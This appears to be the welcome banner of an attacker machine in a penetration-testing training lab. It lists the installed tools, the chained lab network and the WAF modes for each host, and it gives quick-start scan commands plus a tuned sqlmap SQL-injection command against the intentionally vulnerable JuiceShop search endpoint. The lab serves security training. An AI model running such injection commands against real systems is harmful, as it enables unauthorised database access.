  el34 Attacker - pentest learning console
========================================================

Installed tools:
  nmap, hydra, sqlmap, nikto, ncat, pwntools

Network topology (4-tier chained):
  ext (10.20.30.0/24)  <- you are here (10.20.30.202)
       |
       v   default route via fw (10.20.30.1)
  fw (10.20.30.1) ext + (10.20.31.1) pipe
       |
       v
  ips (10.20.31.2) pipe + (10.20.32.1) dmz   <- Suricata IDS
       |
       v
  dmz (10.20.32.0/24): web, siem, portal, wazuh-*
       |
       v   web acts as WAF (Apache + ModSec)
  int (10.20.40.0/24): juiceshop, dvwa, neobank, ...

All HTTP attacks traverse: attacker -> fw -> ips -> web -> vuln
Internal services (siem, dashboard, portal): -> fw -> ips -> [target]

WAF 정책 (vhost 별로 다름 — 대조 실습용):
  juice.el34.lab / ai.el34.lab  = DetectionOnly (탐지만, 공격 성공함)
  dvwa.el34.lab  등 나머지      = On (차단, 403 반환)

Quick start:
  curl http://juice.el34.lab/                    (vuln, via WAF)
  curl -A 'sqlmap/1.7' http://dvwa.el34.lab/     (WAF blocks 403, IDS alerts)
  nmap -sT -p 80,443 10.20.32.80                (web direct, via fw+ips)
  nikto -h http://juice.el34.lab/

SQLi 실습 — JuiceShop 검색은 LIKE '%q%' 안에 들어가므로 sqlmap 기본값은
실패한다(구문오류 → JuiceShop 이 500 반환. WAF 차단이 아님). prefix/suffix 필수:
  sqlmap -u "http://juice.el34.lab/rest/products/search?q=apple" -p q \
    --dbms=sqlite --technique=U --union-cols=9 --prefix="'))" --suffix="--" --batch

